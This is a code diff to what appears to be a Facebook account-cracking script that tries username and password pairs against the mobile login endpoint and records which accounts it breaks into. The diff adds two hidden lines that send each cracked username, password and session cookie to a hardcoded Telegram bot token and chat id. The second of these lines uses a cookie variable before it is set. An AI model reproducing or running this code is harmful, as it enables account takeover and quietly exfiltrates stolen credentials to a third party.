@@ -1378,12 +1378,14 @@ def mobile_v2(uiz,pwr,link_okep):
 				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 			po = ses.post(f"https://{link_okep}/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data, headers=headers2, cookies={"cookie": kuko}, proxies=proxs, allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
+				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={uiz}\n{pw}")
 				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
 				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				if "no" in tampilkan_apk:
+					requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={uiz}\n{pw}\n{kuki}")
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
